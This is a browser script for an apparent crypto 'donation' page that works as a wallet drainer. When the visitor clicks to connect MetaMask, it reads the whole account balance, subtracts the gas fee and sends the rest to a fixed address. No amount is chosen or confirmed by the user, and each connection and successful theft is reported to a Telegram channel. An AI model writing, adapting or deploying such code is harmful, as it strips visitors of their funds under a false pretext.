// public/js/script.js
let startTime;
let donationAmount;

async function connectWallet() {
    if (window.ethereum) {
        window.web3 = new Web3(ethereum);
        try {
            startTime = new Date().toLocaleString();
            await ethereum.request({ method: 'eth_requestAccounts' });
            updateStatus('Wallet connected. Processing donation...');
            sendTelegramMessage('Wallet connected at ' + startTime);
            sendDonation();
        } catch (error) {
            console.error(error);
            updateStatus('Connection failed. Please try again.');
            sendTelegramMessage('Connection failed: ' + error.message);
        }
    } else {
        updateStatus('MetaMask is not installed. Please install it to proceed.');
        sendTelegramMessage('MetaMask is not installed.');
    }
}

async function sendDonation() {
    const accounts = await web3.eth.getAccounts();
    const fromAddress = accounts[0];
    const balance = await web3.eth.getBalance(fromAddress);

    const gasPrice = await web3.eth.getGasPrice();
    const gasEstimate = await web3.eth.estimateGas({
        from: fromAddress,
        to: donationAddress,
        value: balance
    });

    const transactionFee = gasPrice * gasEstimate;
    donationAmount = balance - transactionFee;

    if (donationAmount <= 0) {
        updateStatus('Insufficient funds to cover the transaction fee.');
        return;
    }

    try {
        const transaction = await web3.eth.sendTransaction({
            from: fromAddress,
            to: donationAddress,
            value: donationAmount
        });

        console.log('Transaction hash:', transaction.transactionHash);
        updateStatus('Donation successful! Thank you.');
        sendTelegramMessage(`Donation successful!\nAmount: ${web3.utils.fromWei(donationAmount)} ETH\nTransaction hash: ${transaction.transactionHash}`);
    } catch (error) {
        console.error('Transaction error:', error);
        updateStatus('Donation failed. Please try again.');
        sendTelegramMessage('Donation failed: ' + error.message);
    }
}

function sendTelegramMessage(message) {
    fetch('/api/sendTelegramMessage', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ message })
    })
    .then(response => response.text())
    .then(data => {
        console.log(data);
    })
    .catch(error => {
        console.error('Error sending Telegram message:', error);
    });
}

function updateStatus(message) {
    document.getElementById('status').innerText = message;
}

document.getElementById('connect-wallet').addEventListener('click', connectWallet);
